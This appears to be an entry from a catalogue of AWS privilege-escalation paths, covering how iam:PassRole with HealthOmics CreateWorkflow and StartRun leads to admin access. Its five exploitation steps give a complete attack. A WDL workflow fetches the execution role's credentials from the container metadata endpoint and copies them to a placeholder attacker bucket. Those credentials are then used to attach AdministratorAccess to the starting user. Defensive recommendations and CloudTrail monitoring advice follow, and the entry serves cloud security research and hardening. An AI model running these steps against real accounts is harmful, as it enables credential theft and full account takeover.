id: omics-001
name: iam:PassRole + omics:CreateWorkflow + omics:StartRun
category: new-passrole
services:
  - iam
  - omics
  - s3

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM execution role to the HealthOmics service
    - permission: omics:CreateWorkflow
      resourceConstraints: No resource constraints required
    - permission: omics:StartRun
      resourceConstraints: No resource constraints required
    - permission: s3:GetObject
      resourceConstraints: Must be able to read the exfiltrated credentials from the attacker-controlled S3 bucket after the workflow completes
  additional:
    - permission: omics:GetWorkflow
      resourceConstraints: Useful for polling workflow creation status
    - permission: omics:GetRun
      resourceConstraints: Useful for monitoring run status and confirming execution
    - permission: omics:ListRuns
      resourceConstraints: Helpful for discovering existing runs
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `omics:CreateWorkflow`, and `omics:StartRun` can escalate privileges by creating an AWS HealthOmics WDL workflow containing a task that exfiltrates the execution role's temporary credentials to an attacker-controlled S3 bucket. The attacker starts a run passing an admin execution role, waits for the workflow to complete, retrieves the exfiltrated credentials from S3, and uses them to directly call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. Note that HealthOmics workflow tasks have network isolation from the public internet but do have access to S3, making credential exfiltration via S3 the standard technique.

prerequisites:
  admin:
    - A role must exist that trusts omics.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - An attacker-controlled S3 bucket must be accessible from the HealthOmics task execution environment (the execution role must have s3:PutObject on the bucket)
    - A private ECR repository must contain a container image suitable for running AWS CLI commands (HealthOmics requires private ECR images, not public Docker Hub images)
  lateral:
    - A role must exist that trusts omics.amazonaws.com and has elevated permissions
    - An attacker-controlled S3 bucket must be accessible from the HealthOmics execution environment

exploitationSteps:
  awscli:
    - step: 1
      command: |
        cat > /tmp/exploit.wdl << 'EOF'
        version 1.0
        workflow ExfilWorkflow {
          input {
            String s3_bucket
            String s3_key
          }
          call ExfilTask {
            input: s3_bucket = s3_bucket, s3_key = s3_key
          }
        }

        task ExfilTask {
          input {
            String s3_bucket
            String s3_key
          }
          command <<<
            # HealthOmics injects credentials via the container credential provider
            curl -s http://169.254.170.23/v1/credentials > /tmp/creds.json
            aws s3 cp /tmp/creds.json "s3://~{s3_bucket}/~{s3_key}"
          >>>
          runtime {
            docker: "ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/aws-cli:latest"
            memory: "4 GB"
            cpu: 1
          }
        }
        EOF

        zip /tmp/workflow.zip /tmp/exploit.wdl
        aws s3 cp /tmp/workflow.zip s3://WORKFLOW_BUCKET/workflow.zip
      description: Create a WDL workflow definition that exfiltrates execution role credentials to S3 using the HealthOmics container credential provider endpoint. HealthOmics tasks cannot reach the public internet but do have S3 access.
    - step: 2
      command: |
        aws omics create-workflow \
          --name privesc-workflow \
          --definition-zip fileb:///tmp/workflow.zip \
          --engine WDL \
          --parameter-template '{
            "s3_bucket": {"description": "S3 bucket for credential exfiltration"},
            "s3_key": {"description": "S3 key for credential output"}
          }'
      description: Create the HealthOmics workflow from the WDL definition zip file.
    - step: 3
      command: |
        aws omics start-run \
          --workflow-id WORKFLOW_ID \
          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --name privesc-run \
          --parameters '{
            "s3_bucket": "ATTACKER_BUCKET",
            "s3_key": "exfil/creds.json"
          }' \
          --output-uri s3://WORKFLOW_BUCKET/output/ \
          --storage-capacity 100
      description: Start the workflow run, passing the admin execution role via iam:PassRole. HealthOmics provisions the container and runs the WDL task, which exfiltrates the execution role's credentials to the attacker S3 bucket.
    - step: 4
      command: |
        aws omics get-run \
          --id RUN_ID \
          --query 'status' \
          --output text
      description: Poll run status until COMPLETED, then retrieve the exfiltrated credentials from S3.
    - step: 5
      command: |
        aws s3 cp s3://ATTACKER_BUCKET/exfil/creds.json /tmp/admin-creds.json

        AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/admin-creds.json) \
        AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/admin-creds.json) \
        AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/admin-creds.json) \
        aws iam attach-user-policy \
          --user-name STARTING_USER \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      description: Retrieve the exfiltrated execution role credentials from S3 and use them directly to call iam:AttachUserPolicy, attaching AdministratorAccess to the starting user.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative HealthOmics execution roles** - Genomics workflow tasks rarely need administrative IAM access. Scope execution roles to only the S3 buckets, ECR repositories, and reference stores the workflow legitimately requires.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificOmicsRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "omics.amazonaws.com"
      }
    }
  }
  ```

  - **Control S3 bucket access from HealthOmics execution roles** - The credential exfiltration technique depends on the execution role having `s3:PutObject` on an attacker-controlled bucket. Restrict execution role S3 access to specific known-good bucket ARNs.
  - Monitor CloudTrail for unusual HealthOmics workflow creation followed by run starts with privileged roles
  - Monitor CloudTrail for HealthOmics runs by principals who do not usually start genomics workflows
  - Monitor CloudTrail for roles being passed to HealthOmics that haven't been used before
  - Alert on S3 PutObject events originating from HealthOmics task execution roles to unexpected bucket destinations
  - Regularly audit all IAM roles that trust omics.amazonaws.com and down-scope any with administrative access

limitations: |
  This path uses credential exfiltration via S3 rather than direct IAM API calls from within the task, because HealthOmics workflow tasks have network isolation that prevents direct internet or IAM API access. The execution role must have s3:PutObject permission on the attacker-controlled bucket. The attacker must also have an available private ECR container image, as HealthOmics does not support public Docker Hub images. HealthOmics runs typically take 15+ minutes to complete.

